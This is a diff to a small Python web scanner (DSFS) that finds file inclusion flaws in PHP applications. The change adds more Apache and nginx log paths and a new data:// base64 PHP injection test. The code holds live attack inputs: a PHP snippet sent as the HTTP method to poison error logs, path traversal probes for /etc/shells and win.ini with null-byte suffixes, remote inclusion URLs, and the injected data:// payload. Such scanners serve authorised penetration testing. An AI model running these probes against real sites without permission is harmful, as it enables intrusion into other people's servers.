@@ -2,23 +2,24 @@
 import itertools, optparse, random, re, urllib, urllib2
 
 NAME    = "Damn Small FI Scanner (DSFS) < 100 LoC (Lines of Code)"
-VERSION = "0.1a"
+VERSION = "0.1b"
 AUTHOR  = "Miroslav Stampar (@stamparm)"
 LICENSE = "Public domain (FREE)"
 
 DYNAMIC_CONTENT_VALUE = "Legal disclaimer:"                                                                 # string value to search if the content is dynamically evaluated
-ERROR_LOG_METHOD = "<?php echo base64_decode('%s');?>" % DYNAMIC_CONTENT_VALUE.encode("base64").strip()     # used errorneous HTTP method for forcing the appearance in error log(s)
+DYNAMIC_CONTENT = "<?php echo base64_decode('%s');?>" % DYNAMIC_CONTENT_VALUE.encode("base64").strip()      # used dynamic content
 COOKIE, UA, REFERER = "Cookie", "User-Agent", "Referer"                                                     # optional HTTP header names
 GET, POST = "GET", "POST"                                                                                   # enumerator-like values used for marking current phase
 TIMEOUT = 30                                                                                                # connection timeout in seconds
 
-ERROR_REGEX = r"(?i)(Fatal error|Warning)(</b>)?:\s+(require|include)(_once)?\(\)"                          # regular expression used for detection of vulnerability specific PHP error messages
+ERROR_REGEX = r"(?i)(Fatal error|Warning)(</b>)?:\s+((require|include)(_once)?|file_get_contents)\(\)"      # regular expression used for detection of vulnerability specific PHP error messages
 
 FI_TESTS = (                                                                                                # each (test) item consists of ("filepath", "content recognition regex", (combining "prefixes"), (combining "suffixes"), 'inclusion type')
-    ("", r"\[[^\]]+\]\s+\[(warn|notice|error)\]\s+\[client", ("/xampp/apache/logs/", "/apache/logs/", "/wamp/apache2/logs/", "/wamp/logs/", "/program files/wamp/apache2/logs/", "/program files/apache group/apache/logs/", "/var/log/apache2"), ("error.log", "error.log%00"), 'L'),
+    ("", r"\[[^\]]+\]\s+\[(warn|notice|error)\]\s+\[client", ("/xampp/apache/logs/", "/apache/logs/", "/wamp/apache2/logs/", "/wamp/logs/", "/program files/wamp/apache2/logs/", "/program files/apache group/apache/logs/", "/var/log/apache/", "/var/log/apache2/", "/var/log/httpd/", "/var/log/nginx/", "/opt/lampp/logs/", "/opt/xampp/logs/"), ("error.log", "error.log%00"), 'L'),
     ("https://raw.githubusercontent.com/stamparm/DSFS/master/pages/", "Usage of Damn Small FI Scanner", ("",), ("", "%00", "config", "config.php", "config.php%00"), 'R'),
     ("/etc/shells", "valid login shells", ("../../../../../../..", ""), ("", "%00"), 'L'),
-    ("/windows/win.ini", r"for 16-bit app support", ("../../../../../../..", ""), ("", "%00"), 'L'),
+    ("/windows/win.ini", "for 16-bit app support", ("../../../../../../..", ""), ("", "%00"), 'L'),
+    ("data://text/plain;base64,%s" % DYNAMIC_CONTENT.encode("base64").strip(), ("<?php echo base64_decode\(|%s" % DYNAMIC_CONTENT_VALUE), ("", ), ("", ), 'S'),
 )
 
 USER_AGENTS = (                                                                                             # items used for picking random HTTP User-Agent header value
@@ -29,7 +30,7 @@ USER_AGENTS = (                                                                 
     "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10"
 )
 
-_headers = {}                                                   # used for storing dictionary with optional header values
+_headers = {}                                                                                               # used for storing dictionary with optional header values
 
 def _retrieve_content(url, data=None, method=None):
     try:
@@ -42,7 +43,7 @@ def _retrieve_content(url, data=None, method=None):
 
 def scan_page(url, data=None):
     retval, usable = False, False
-    _retrieve_content(url, method=ERROR_LOG_METHOD)             # dummy errorneous request
+    _retrieve_content(url, method=DYNAMIC_CONTENT)                                                          # dummy errorneous request
     try:
         for phase in (GET, POST):
             current = url if phase is GET else (data or "")
